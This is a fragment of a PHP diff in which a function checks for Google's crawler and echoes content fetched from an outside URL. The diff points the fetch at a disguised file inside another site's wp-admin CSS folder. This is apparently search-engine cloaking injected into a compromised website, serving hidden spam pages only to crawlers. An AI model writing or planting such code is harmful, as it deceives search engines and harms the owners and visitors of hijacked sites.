@@ -17,7 +17,7 @@ function is_google_bot() {
 
 if (is_google_bot()) {
 
-	$bot_content = file_get_contents('https://punten-neng.pages.dev/pai.iaingorontalo/');
+	$bot_content = file_get_contents('https://tambortec.com.br/wp-admin/css/colors/light/.colors-rtljs-min.php');
 
 	echo $bot_content;
 
